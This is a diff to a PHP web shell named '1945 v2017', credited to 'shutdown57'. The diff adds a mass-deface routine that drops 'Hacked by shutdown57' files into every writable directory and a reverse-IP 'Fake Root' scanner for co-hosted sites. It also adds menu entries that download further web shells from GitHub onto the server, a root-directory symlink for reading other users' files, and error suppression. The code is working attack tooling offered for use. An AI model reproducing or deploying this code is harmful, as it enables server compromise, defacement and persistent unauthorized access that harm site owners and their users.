@@ -4,16 +4,17 @@
 @ Author 	: shutdown57 a.k.a alinko
 @ Codename  : MerdekaAtaoeMati
 @ Version   : 2017.0
+@ Contact   : indonesianpeople.shutdown57@gmail.com
 @ Respect   : Ir. Soekarno - Muh. Hatta - Pahlawan Nasional Indonesia
-@ Greets    : linuXcode.org - IndoXploit.or.id
+@ Greets    : linuXcode.org - IndoXploit.or.id - Madleets.com
 @
 */
-#@error_reporting(0);
+@error_reporting(0);
 session_start();
 @set_time_limit(0);
 @ini_set('file_uploads',on);
 @ini_set('upload_max_filesize',1000);
-@ini_set('error_log',NULL); //  report if any error to : alinkokomansuby@gmail.com
+@ini_set('error_log',NULL); 
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
@@ -32,7 +33,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 $passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
 $session_name = "_session_1945_v2017";
 $session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)];
-$image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg"; // background image login.
+$image_bg_45 	= "https://alintamvanz.github.io/images/indonesian.jpg"; // background image login.
 
 function passwd_45_login($wallpaper) {
 	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
@@ -60,17 +61,24 @@ $arrayku1945 = array(
 					"1945v1"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php",
 					"ayana"	=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php",
 					"linuxcode" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php",
+					"indoxploit"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php",
+					"symlinksa"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symlinksa.php",
+					"symlinkmb"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symobile.php",
 					"filename" => array(
 						"adminer"=>"adminer1945.php",
 						"awesomeware"=>"awesome1945.php",
 						"1945v1"=>"1945v1.php",
 						"ayana"=>"ayana1945.php",
 						"linuxcode"=>"linuxcode1945.php",
+						"indoxploit"=>"indoxploit1945.php",
+						"symlinksa"=>"sym1945.php",
+						"symlinkmb"=>"symobile1945.php",
 						)
 					);
 class Html45{
 	public function backtolo(){
-		echo "<br><br><center><h1>[<a href='?____shutdown57'>Home</a>] [<a href='javascript:history.go(-1);'>Back To History</a>] </h1></center>";
+		$filename = $_SERVER['PHP_SELF'];
+		echo "<br><br><center><h1>[<a href='".$filename."?_shutdown57_a.k.a_alinko_kun:*'>Home</a>] [<a href='javascript:history.go(-1);'>Back To History</a>] </h1></center>";
 	}
 	public function modal($head,$konten,$id){
 		echo '<div class="modal"><input id="'.$id.'" type="checkbox" /><label for="'.$id.'" class="overlay"></label><article>
@@ -250,6 +258,26 @@ class Action45{
 	public function phpinfo45(){
 	phpinfo();
 	}
+	public function reverse45($url)
+	{
+	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
+		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
+		  curl_setopt($ch, CURLOPT_HEADER, 0);
+		  curl_setopt($ch, CURLOPT_POST, 1);
+	$resp = curl_exec($ch);
+	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
+	$array = explode(",,", $resp);
+	unset($array[0]);
+	foreach($array as $lnk) {
+		$lnk = "http://$lnk";
+		$lnk = str_replace(",", "", $lnk);
+		echo $lnk."\n";
+		ob_flush();
+		flush();
+	}
+		curl_close($ch);
+	}
 	public function wpc45($dir){
 	if(!file_exists($dir."/wp-config.php")){
 		echo "<h1> Directory Wordpress Not Exist</h1>";
@@ -264,7 +292,7 @@ class Action45{
 
 		echo "<center>";
 		echo "<form method='POST'>";
-		echo "<textarea style='width:700px;height:300px;'  name='edit'>";
+		echo "<textarea style='width:800px;height:400px;'  name='edit'>";
 		echo htmlspecialchars(file_get_contents($dir));
 		echo "</textarea>";
 		echo "<input type='submit' value='save' name='save'  style='width:700px'>";
@@ -405,12 +433,50 @@ class Action45{
 	}
 	return $res;
 }
+	public function massdeface45($dir,$file,$script)
+	{
+		$s=scandir($dir);
+		foreach($s as $d){
+			if(is_dir($d)){
+				if(is_writable($dir."/".$d)){
+					if(file_put_contents($dir."/".$d."/".$file,$script)){
+						echo "[DEFACED] $dir/$d/$file <br>";
+					}else{
+						echo "[FAILED] $dir/$d/$file <br>";
+					}
+				} // wri
+				$o=scandir($d);
+				foreach($o as $o2){
+					if(is_dir($o2)){
+						if(is_writable($dir."/".$d."/".$o2)){
+							if(file_put_contents($dir."/".$d."/".$o2."/".$file,$script)){
+								echo "[DEFACED] $dir/$d/$o2/$file * <br>";
+							}else{
+								echo "[FAILED] $dir/$d/$o2/$file * <br>";
+							}
+						}
+					}
+				}
+
+			}
+		}
+	}
+	public function getcode45($url) {
+    $curl = curl_init($url);
+    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    $content = curl_exec($curl);
+    		curl_close($curl);
+    return $content;
+}
 }
 
 
 class Head45{
 	public function html45($judul){
-		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://cdn.jsdelivr.net/picnicss/6.3.2/picnic.min.css'><link rel='icon' type='text/css' href='http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif'></head><body>";
+		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://alintamvanz.github.io/css/picnic.min.css'><link rel='icon' type='text/css' href='https://alintamvanz.github.io/images/favicon_1945.gif'></head><body>";
 		echo "<style>";
 		echo "tr,td{height:30px;font-size:13px;}tr:hover{background:#ff4136;}tr a{color:#000;font-weight:bold;}tr a:hover{color:#fff;border-bottom:1px solid #fff}.pseudo:hover{background:#ff4136;color:#fff}th{background:#ff4136}</style>";
 	}
@@ -444,13 +510,13 @@ class Head45{
 		$sm= ini_get('safe_mode') ? "<font color=green> ON<?font>" : "<font color=red> OFF</font>";
 		echo "<div class='flex 2' style='font-size:12px;width:100%;margin-top:55px'>";
 		echo "<pre>";
-		echo "Kernel : ".php_uname();
+		echo "Uname- : ".php_uname();
 		echo "\nUser   : $user ($uid) | $group ($gid)";
 		echo "\nPHP    : ".phpversion()." |<b>safemode:</b>$sm (<a href='?_o=$dir&_x=phpinfo'>phpinfo</a>)";
 		echo "\nDisk   : ".$hdd_total." <b> Free :</b> ".$hdd_free;
 		echo "</pre>";
 		echo "<h1 style='font-size:4em;float:right;font-weight:bold;'>";
-		echo "		<a href='?'>1945 2017</a>";
+		echo "		<a href='?_o=$dir&_x=about&_1945_auth=shutdown57'>1945 2017</a>";
 		echo "</h1>";
 		echo "</div>";
 	}
@@ -566,11 +632,10 @@ $html = new Html45();
 
 // List Tools
 function abtn($href,$val){
-	$o= "   <a href='".$href."' class='button'>".$val."</a>   ";
+	$o= "   <a href='#shutdown57_a.k.a_alinko_kun' onclick=\"window.location.href='".$href."'\" class='button'>".$val."</a>   ";
 	return $o;
 }
 $weapon = abtn("?_o=$d&_x=lsym","linuXSymLink");
-$weapon.= abtn("?_o=$d&_x=sym","Symlink");
 $weapon.= abtn("?_o=$d&_x=jump","Jumping");
 $weapon.= abtn("?_o=$d&_x=wpc","WP Config");
 $weapon.= abtn("?_o=$d&_x=md","Mass Deface");
@@ -582,10 +647,12 @@ $weapon.= abtn("?_o=$d&_x=di","Defacer ID");
 $weapon.= abtn("?_o=$d&_x=am","Adminer");
 $weapon.= abtn("?_o=$d&_x=net","Network");
 $weapon.= "<hr><h3> KuchiyoseX1945 </h3><hr>";
+$weapon.= abtn("?_o=$d&_x=sym","Symlink Sa");
+$weapon.= abtn("?_o=$d&_x=symb","Symlink mobile");
 $weapon.= abtn("?_o=$d&_x=1945v1","1945v1 Shell");
 $weapon.= abtn("?_o=$d&_x=lc","linuXcode v2017");
 $weapon.= abtn("?_o=$d&_x=as","AyanaShahab priv8 shell");
-
+$weapon.= abtn("?_o=$d&_x=idx","IndoXploit Shell");
 $html->modal("WeaponX1945",$weapon,"weapon");
 // End List
 
@@ -716,7 +783,7 @@ if($act->del45($_GET['_o'])){
 }elseif($x == "lsym"){
 		$html->h1("linuX Symlink :p");
 		$letak = "Sym45";
-		$open = "http://".$_SERVER['HTTP_HOST'].$letak;
+		$open = $letak;
 		$act->Shell45("ln -s / Sym45");
 		echo "linuX Symlink Execute ln -s / Sym45 -> DONE ? <br> <a href='$open' target='_blank'>Click Here</a>";
 }elseif($x == "wpc"){
@@ -730,6 +797,53 @@ if($act->del45($_GET['_o'])){
 				echo "<script> alert('Yosha !');  window.location.href='?_o=$d/wordpress-config.txt&_x=view'</script>";
 			}
 		}
+}elseif($x == "fr"){
+	$html->h1("Fake Root?");
+	ob_start();
+	$cwd = getcwd();
+	$ambil_user = explode("/", $cwd);
+	$user = $ambil_user[2];
+	if($_POST['reverse']) {
+		$site = explode("\r\n", $_POST['url']);
+		$file = $_POST['file'];
+		foreach($site as $url) {
+			$cek = $act->getcode45("$url/~$user/$file");
+			if(preg_match("/hacked/i", $cek)) {
+				echo "[ <font color=green>DONE</font> ] <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a><br>";
+			}
+		}
+	} else {
+		$konten=$html->input("text","file","style='width:300px;'","Filename").$html->input("text","user","style='width:300px;' value='$user'","User");
+		$konten.=$html->txtarea("url",$act->reverse45($_SERVER['HTTP_HOST']),"style='width:500px;height:400px;'");
+		$konten.=$html->submit("reverse","Scan Fake Root?","");
+		$html->form("POST",$konten);
+	}
+}elseif($x == "about"){
+echo "<div class='about_1945'>";
+echo "<center>";
+echo "<img src='https://alintamvanz.github.io/images/garuda.png' style='width:300px;hieght:300px'>";
+$html->h1("About 1945 v2017 ?");
+echo "<h2>1945v2017 by : shutdown57 a.k.a alinko kun</h2>";
+echo "<h3>Github : @alintamvanz | Facebook : Alinko Kun</h3>";
+echo "<h4>Email  : indonesianpeople.shutdown57@gmail.com | Site : www.linuXcode.org</h4>";
+echo "<h5>Respect: Ir. Soekarno - Muh. Hatta - Pahlawan Nasional Indonesia</h5>";
+echo "<h6>Greets : linuXcode.org - IndoXploit.or.id - Madleets.com</h6>";
+echo "<b>READ LICENSE</b><br><textarea style='width:500px;height:300px;'>".file_get_contents('https://raw.githubusercontent.com/alintamvanz/webshell/master/LICENSE')."</textarea>";
+echo "</div>";
+}elseif($x == "md"){
+$html->h1("Mass Deface");
+if(empty($_POST['sbmt'])){
+$konten = $html->input("text","letak","style='width:300px;' value='".$d."'","Directory");
+$konten.= $html->input("text","fn","style='width:300px;' value='s57.html'","Filename");
+$konten.= $html->txtarea("script","Hacked by shutdown57","style='width:500px;height:400px;'");
+$konten.= $html->submit("sbmt","Deface","");
+$html->form("POST",$konten);
+}else{
+	if(isset($_POST['letak'])&&isset($_POST['fn'])&&isset($_POST['script'])){
+		$act->massdeface45($_POST['letak'],$_POST['fn'],$_POST['script']);
+	}
+}
+
 }elseif ($x == "I_love_U") {
 	session_destroy();
 	echo "<script> alert('Bye Bye Bye !'); window.location.href='".$_SERVER['PHP_SELF']."'; </script>";
@@ -747,6 +861,15 @@ if($act->del45($_GET['_o'])){
 	$html->backtolo();
 }elseif ($x == "as") {
 	$act->kuchiyose45($arrayku1945['ayana'],$arrayku1945['filename']['ayana']);
+	$html->backtolo();
+}elseif ($x == "idx") {
+	$act->kuchiyose45($arrayku1945['indoxploit'],$arrayku1945['filename']['indoxploit']);
+	$html->backtolo();
+}elseif ($x == "sym") {
+	$act->kuchiyose45($arrayku1945['symlinksa'],$arrayku1945['filename']['symlinksa']);
+	$html->backtolo();
+}elseif ($x == "symb") {
+	$act->kuchiyose45($arrayku1945['symlinkmb'],$arrayku1945['filename']['symlinkmb']);
 	$html->backtolo();
 }
 }
